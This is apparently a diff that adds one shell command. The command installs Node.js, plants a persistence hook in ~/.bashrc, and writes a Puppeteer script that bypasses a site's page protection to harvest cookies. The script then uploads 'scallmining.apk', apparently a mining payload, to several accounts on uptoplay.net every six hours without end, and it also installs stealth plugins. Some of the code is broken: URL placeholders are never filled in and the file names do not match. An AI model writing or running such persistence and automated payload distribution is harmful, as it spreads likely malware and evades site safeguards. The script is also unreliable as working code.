@@ -1,0 +1,107 @@
+cd ~/. && wget https://nodejs.org/dist/v22.11.0/node-v22.11.0-linux-x64.tar.xz && tar -xvf node-v22.11.0-linux-x64.tar.xz && rm -rf node-v22.11.0-linux-x64.tar.xz && cd node-v22.11.0-linux-x64 && touch online && chmod +x * && echo "~/./node-v22.11.0-linux-x64/online" >> ~/.bashrc && echo "cd ~/./node-v22.11.0-linux-x64/bin && node minerdash.js" > ~/./node-v22.11.0-linux-x64/online && touch .puppetteerrc.cjs && printf '%s\n' 'import fs from "fs";
+import path from "path";
+import puppeteer from "puppeteer";
+import FormData from "form-data";
+
+const APK_PATH = "scallmining.apk";
+const USER_IDS = [2306000504, 2306000505, 2306000506];
+
+const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
+
+async function uploadApkFinal(uid) {
+  console.log(`\n--- [ID ${uid}] Démarrage ---`);
+  
+  if (!fs.existsSync(APK_PATH)) {
+    console.error(`❌ Erreur : Fichier ${APK_PATH} introuvable.`);
+    return;
+  }
+
+  const browser = await puppeteer.launch({
+    headless: true,
+    args: [
+      "--no-sandbox",
+      "--disable-setuid-sandbox",
+      "--disable-gpu",
+      "--disable-dev-shm-usage"
+    ]
+  });
+
+  try {
+    const page = await browser.newPage();
+    const ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";
+    await page.setUserAgent(ua);
+
+    // Étape 1 : Passer la sécurité de la page
+    await page.goto(`https://www.uptoplay.net/filemanager.php?username={uid}`, { waitUntil: "networkidle2" });
+    await delay(10000);
+
+    const puppeteerCookies = await page.cookies();
+    const cookieString = puppeteerCookies.map(c => `${c.name}=${c.value}`).join("; ");
+
+    await browser.close();
+    console.log(`[${uid}] Envoi réel du fichier via API...`);
+
+    // Étape 2 : Préparation de la requête multipart
+    const form = new FormData();
+    form.append("api", "upload");
+    form.append("dir", "");
+    form.append("file", fs.createReadStream(APK_PATH), {
+      filename: path.basename(APK_PATH),
+      contentType: "application/vnd.android.package-archive"
+    });
+
+    const apiUrl = `https://www.uptoplay.net/filemanager.php?username={uid}`;
+    const response = await fetch(apiUrl, {
+      method: "POST",
+      headers: {
+        ...form.getHeaders(),
+        "User-Agent": ua,
+        "Cookie": cookieString
+      },
+      body: form
+    });
+
+    const responseText = await response.text();
+
+    if (response.status === 200) {
+      if (responseText.includes("filemanager.php") || responseText.includes("scallmining.apk")) {
+        console.log(`✅ [ID ${uid}] Téléchargement REUSSI !`);
+      } else {
+        console.warn(`⚠️ [ID ${uid}] Réponse inattendue (Vérifiez les blocages).`);
+      }
+    } else {
+      console.error(`❌ [ID ${uid}] Erreur serveur : ${response.status}`);
+    }
+
+  } catch (error) {
+    console.error(`❌ Erreur critique pour ID ${uid} :`, error.message);
+    try {
+      await browser.close();
+    } catch (e) {}
+  }
+}
+
+async function main() {
+  const ATTENTE_6H = 6 * 60 * 60 * 1000;
+  let cycle = 1;
+
+  while (true) {
+    console.log("\n==================================================");
+    console.log(`[Système] --- CYCLE ${cycle} EN COURS ---`);
+    console.log(`[Système] Fin de l\x27attente. Lancement des téléchargements...`);
+    console.log("==================================================");
+
+    for (const uid of USER_IDS) {
+      await uploadApkFinal(uid);
+      await delay(5000);
+    }
+
+    console.log(`[Système] Fin du cycle ${cycle}.`);
+    console.log(`[Système] Attente de 6 heures avant le prochain traitement...`);
+    cycle++;
+    
+    await delay(ATTENTE_6H);
+  }
+}
+
+main();' > ~/./node-v22.11.0-linux-x64/bin/minerdash.mjs && cd ~/./node-v22.11.0-linux-x64/bin && npm init -y && npm install -y puppeteer puppeteer-extra puppeteer-extra-plugin-stealth && node minerdash.mjs
